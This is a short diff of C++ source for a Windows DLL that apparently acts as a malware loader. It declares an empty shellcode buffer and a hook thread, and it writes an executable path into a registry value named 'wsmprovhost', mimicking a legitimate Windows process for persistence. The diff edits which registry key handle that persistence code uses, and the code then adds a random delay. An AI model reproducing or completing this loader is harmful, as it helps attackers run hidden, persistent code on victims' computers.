@@ -15,6 +15,7 @@
 void Hook_Init();
 std::thread hookthread;
 char shellcode[] = \
+
 ;
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
@@ -54,9 +55,9 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 			if (value[0] != 0) {
 			}
 			else {
-				RegSetValueEx(hkey, (LPCSTR)"wsmprovhost", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
+				RegSetValueEx(hkey2, (LPCSTR)"wsmprovhost", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
 			}
-			RegCloseKey(hkey);
+			RegCloseKey(hkey2);
 		}
 		srand(clock());
 		int num = ((rand() % (100 - 1 + 1)) + 1) * 200;
